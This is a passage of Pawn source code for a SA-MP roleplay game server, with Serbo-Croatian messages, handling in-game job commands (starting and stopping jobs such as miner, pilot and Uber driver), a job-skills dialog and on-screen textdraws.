				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PNOVCA )
	{
	    if( PosaoPNovcaCP[ playerid ] != 0 )
		{
	        PosaoPNovcaCP[ playerid ] = 0;
 			DisablePlayerCheckpoint( playerid );
 			CheckpointStatus[ playerid ] = 0;

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if(PlayerInfo[playerid][xPosao] == POSAO_RUDAR)
	{
		if(PosaoRudar[playerid] != 0)
		{
			PosaoRudar[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			CheckpointStatus[playerid] = 0;
			
			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
		}
		else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_UBERDRIVER)
	{
	    if( PosaoUberCP[ playerid ] != 0 )
		{
	        PosaoUberCP[ playerid ] = 0;
 			DisablePlayerCheckpoint( playerid );
 			CheckpointStatus[ playerid ] = 0;

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PNAMJESTAJA)
	{
	    if( PosaoPNamjestajaCP[ playerid ] != 0 )
		{
	        PosaoPNamjestajaCP[ playerid ] = 0;
 			DisablePlayerCheckpoint( playerid );
 			CheckpointStatus[ playerid ] = 0;
			RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
			SetPlayerSpecialAction(playerid, false);

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PMUNICIJE)
	{
	    if( PosaoPMunicijeCP[ playerid ] != 0 )
		{
	        PosaoPMunicijeCP[ playerid ] = 0;
	        PosaoPMunicijeTable[ playerid ] = 0;
 			DisablePlayerCheckpoint( playerid );
 			CheckpointStatus[ playerid ] = 0;
			RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
			SetPlayerSpecialAction(playerid, false);

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	return 1;
}

CMD:posaoskillovi(playerid) 
{
	static string[400];
	format(string, sizeof(string), "Posao\tTrenutni Skill\tMaksimalni Skill\n\
									Mehanicar\t%d\t100\n\
									Proizvodjac Municije\t%d\t100\n\
									Pilot\t%d\t100\n\
									Rudar\t%d\t20\n\
									Prevoznik Novca\t%d\t100\n\
									Uber\t%d\t100\n\
									Proizvodac Namjestaja\t%d\t100",
																	jskInfo[playerid][skill_Mehanicar],
																	jskInfo[playerid][skill_PMunicije],
																	jskInfo[playerid][skill_Pilot],
																	jskInfo[playerid][skill_Rudar],
																	jskInfo[playerid][skill_PNovca],
																	jskInfo[playerid][skill_Uber],
																	jskInfo[playerid][skill_PNamjestaja]);
	ShowPlayerDialog(playerid, dialog_POSAOSKILLS, DIALOG_STYLE_TABLIST_HEADERS, "Posao Skillovi", string, "OK", "");
	return 1;
}

CMD:posao( playerid )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA && PoliceDuty[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes raditi dok si na duznosti.");

    if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK )
	{
	    new Float:X, Float:Y, Float:Z;
	    GetPlayerPos(playerid, X, Y, Z);
	    SMG_SetPlayerPos(playerid, X, Y, Z+1);
		SendInfoMessage( playerid, "Skinuo ti se jetpack te je unisten. (Anti-AA)" );
	}
	switch(PlayerInfo[ playerid ][ xPosao ])
	{
	    case POSAO_NEMA: SendErrorMessage(playerid, "Vi nemate posao.");
	    case POSAO_MEHANICAR: SendErrorMessage(playerid, "Vi ste mehanicar, imate druge komande {FFFFFF}[ /help > Posao ].");
		case POSAO_PMUNICIJE:
		{
		    if(UzeoOpremu[playerid] == false) return SendErrorMessage(playerid, "Nemate opremu!" );
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, -10.9390,-275.7184,1529.5376)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
			if(PosaoPNamjestajaCP[playerid] != 0) return SendErrorMessage(playerid, "Vec imas aktiviran posao, kucaj {FFFFFF}[ /stopwork ] {FF0000}ako zelis prekinuti rutu.");
			if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");

			SendJobMessage(playerid, "Odnesite materijale do nekog radnog stola kako bi napravili municiju.");

			AccountVerified[ playerid ] = false;
			CheckpointStatus[playerid] = 10;
			PosaoPMunicijeCP[playerid] = 1;

			new r_ammo = random(sizeof(RandomAmmoPos));
			SMG_SetPlayerCheckpoint(playerid, RandomAmmoPos[r_ammo][0], RandomAmmoPos[r_ammo][1], RandomAmmoPos[r_ammo][2], 1.0);
			PosaoPMunicijeTable[playerid] = r_ammo;

	    	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
	    	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1);
	    	SetPlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE, 2358, 6, 0.0, 0.10, -0.2, -110.0, 0.0, 78.0);
		}
		case POSAO_PILOT:
		{
			if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
			if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1926.1537,-2399.1230,13.5469)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
			if( LetZG[ playerid ] != 0 || LetSA[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imate aktiviran posao.");
	        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");

			AccountVerified[ playerid ] = false;
			ShowPlayerDialog( playerid, dialog_PILOT, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Let BG - ZG\n{4282C0}(2). {FFFFFF}Let BG - SA", "Potvrdi", "Odustani" );
		}
		case POSAO_RUDAR:
		{
		    if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
			if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");
			if( PosaoRudar[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ste poceli sa poslom." );

	        new randomruda = (random(15) + 1);
			SMG_SetPlayerCheckpoint( playerid, RandomRudnik[ randomruda ][ 0 ], RandomRudnik[ randomruda ][ 1 ], RandomRudnik[ randomruda ][ 2 ], 2.5 );
			CheckpointStatus[ playerid ] = 32;
			SendJobMessage( playerid, "Krenuli ste sa kopanjem ruda, mesto za kopanje je oznaceno crveno na mapi." );
			PosaoRudar[ playerid ] = 1;
			AccountVerified[ playerid ] = false;
		}
		case POSAO_PNOVCA:
		{
		    if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
			if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1533.7557, -1014.7694, 24.2872)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
			if( PosaoPNovcaCP[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas aktiviran posao, kucaj {FFFFFF}[ /stopwork ] {FF0000}ako zelis prekinuti rutu." );
	        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");

	  		SMG_SetPlayerCheckpoint( playerid, 1903.4650,962.3221,10.4843, 5.0 );
			CheckpointStatus[ playerid ] = 3;
			SendJobMessage( playerid, "Krenuli ste sa dostavom novca, mjesto na mapi vam je oznaceno crvenim markerom." );
			PosaoPNovcaCP[ playerid ] = 1;

			StaroVreme[ playerid ] = gettime();
	    	NovoVreme[ playerid ] = 80;
	    	AccountVerified[ playerid ] = false;

			if( PosaoVozilo[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
			if( PosaoTrailer[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
			PosaoVozilo[ playerid ] = SMG_CreateVehicle(428, 1533.7557, -1014.7694, 24.2872, 90.0000, 1, 0, -1 );
			LinkVehicleToInterior( PosaoVozilo[ playerid ], GetPlayerInterior( playerid ) );
	        SetVehicleVirtualWorld( PosaoVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
	        ResetVehicle( PosaoVozilo[ playerid ] );
			vCanDrive[ PosaoVozilo[ playerid ] ] = 1;
		    PutPlayerInVehicle( playerid, PosaoVozilo[ playerid ], 0 );
			ResetVehicleStatistics( PosaoVozilo[ playerid ] );

			VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = true;
			new string[ 20+MAX_PLAYER_NAME+1 ];
	  		format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
			VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

			new engine, lights, alarm, doors, bonnet, boot, objective;
		    GetVehicleParamsEx( PosaoVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
		    SetVehicleParamsEx( PosaoVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );
		}
		case POSAO_UBERDRIVER:
		{
		    if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
			if( !IsPlayerInRangeOfPoint(playerid, 3.0, 1778.0533, -1904.6150, 13.3879)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
			if( PosaoUberCP[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas aktiviran posao, kucaj {FFFFFF}[ /stopwork ] {FF0000}ako zelis prekinuti rutu." );
	        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");

	        new rand = random(sizeof(uberPutnikPos));
	  		SMG_SetPlayerCheckpoint( playerid, uberPutnikPos[rand][uberPutnikX], uberPutnikPos[rand][uberPutnikY], uberPutnikPos[rand][uberPutnikZ], 3.0 );

	  		uberActor[playerid] = CreateDynamicActor(uberPutnikPos[rand][uberPutnikSkin], uberPutnikPos[rand][uberPutnikX], uberPutnikPos[rand][uberPutnikY], uberPutnikPos[rand][uberPutnikZ], uberPutnikPos[rand][uberPutnikA], 1, 100.0, -1, -1, playerid);
	  		ApplyActorAnimation(uberActor[playerid], "PED", "IDLE_TAXI", 4.1, 0, 0, 0, 0, 0);

			CheckpointStatus[ playerid ] = 4;
			SendJobMessage( playerid, "Otidjite po putnika, mjesto na mapi vam je oznaceno crvenim markerom." );
			PosaoUberCP[ playerid ] = 1;

			StaroVreme[ playerid ] = gettime();
	    	NovoVreme[ playerid ] = 30;
	    	AccountVerified[ playerid ] = false;

			if( PosaoVozilo[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
			if( PosaoTrailer[ playerid ] != -1 )
			{
				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
		        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
			    ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
			PosaoVozilo[ playerid ] = SMG_CreateVehicle(420, 1778.0533, -1904.6150, 13.3879, 270.0000, 6, 6, -1);
			LinkVehicleToInterior( PosaoVozilo[ playerid ], GetPlayerInterior( playerid ) );
	        SetVehicleVirtualWorld( PosaoVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
	        ResetVehicle( PosaoVozilo[ playerid ] );
			vCanDrive[ PosaoVozilo[ playerid ] ] = 1;
		    PutPlayerInVehicle( playerid, PosaoVozilo[ playerid ], 0 );
			ResetVehicleStatistics( PosaoVozilo[ playerid ] );

			VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = true;
			new string[ 20+MAX_PLAYER_NAME+1 ];
	  		format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
			VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

			new engine, lights, alarm, doors, bonnet, boot, objective;
		    GetVehicleParamsEx( PosaoVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
		    SetVehicleParamsEx( PosaoVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );
		}
		case POSAO_PNAMJESTAJA:
		{
		    if(UzeoOpremu[playerid] == false) return SendErrorMessage(playerid, "Nemate opremu!" );
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, -2149.7056, 2779.1912, 13.3109)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
			if(PosaoPNamjestajaCP[playerid] != 0) return SendErrorMessage(playerid, "Vec imas aktiviran posao, kucaj {FFFFFF}[ /stopwork ] {FF0000}ako zelis prekinuti rutu.");

	  		SMG_SetPlayerCheckpoint(playerid, -2118.6230, 2747.7791, 12.3069, 2.0);
			SendJobMessage(playerid, "Odnesite kutiju u masinu kako bi poceli proizvodnju namjestaja.");
			CheckpointStatus[playerid] = 5;
			PosaoPNamjestajaCP[playerid] = 1;

	    	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
	    	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1);
	    	SetPlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE, 2912, 1, 0.15, 0.4, 0.0, 0.0, 90.0, 0.0, 1.0, 1.0, 1.0);
		}
	}
	return 1;
}

_:public quest_CreateTDs(playerid, bool:show) {
	if(show == true) {
		quest_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 14.666638, 193.162979, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][0], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, quest_pTD[playerid][0], 155.000000, 57.000000);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][0], 187);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][0], 4);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][0], 0);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][0], 0);

		quest_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 7.000000, 185.000000, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, quest_pTD[playerid][1], 22.000000, 22.000000);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][1], 255);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][1], 0);

		quest_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 7.999999, 186.000000, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][2], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, quest_pTD[playerid][2], 20.000000, 20.000000);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][2], 860593407);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][2], 4);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][2], 0);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][2], 0);

		quest_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 15.800025, 191.200378, "?");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][3], 0.218555, 0.917688);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][3], 255);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][3], 3);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][3], 0);

		quest_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 93.832649, 194.990249, "text 30x3");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][4], 0.157443, 0.996131);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][4], 2);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][4], -1);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][4], 1);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][4], 80);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][4], 0);

		quest_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 92.833465, 225.508132, "nagrada 30x2");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][5], 0.236551, 1.000177);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][5], 2);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][5], 1);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][5], 80);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][5], 3);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][5], 0);

		quest_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 14.466668, 247.359420, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, quest_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, quest_pTD[playerid][6], 155.000000, 3.000000);
		PlayerTextDrawAlignment(playerid, quest_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, quest_pTD[playerid][6], 860593407);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, quest_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, quest_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, quest_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, quest_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, quest_pTD[playerid][6], 0);

		for(new i = 0; i < 7; i++) PlayerTextDrawShow(playerid, quest_pTD[playerid][i]);
	}
	else if(show == false) {
		for( new i = 0; i < 7; i ++) {
		    PlayerTextDrawHide( playerid, quest_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, quest_pTD[ playerid ][ i ] );
			quest_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
	return 1;
}

_:public posao_PNamjestajTDs(playerid, bool:show) {
	if(show == true) {
		PNamjestaj_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 121.755645, 175.948776, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][0], 0.000000, 7.600001);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][0], 502.200012, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][0], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][0], 0);

		PNamjestaj_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 124.222305, 189.502243, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][1], 0.000000, 5.911110);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][1], 195.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][1], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][1], 0);

		PNamjestaj_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 200.222198, 189.502243, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][2], 0.000000, 5.911110);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][2], 271.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][2], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][2], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][2], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][2], 0);
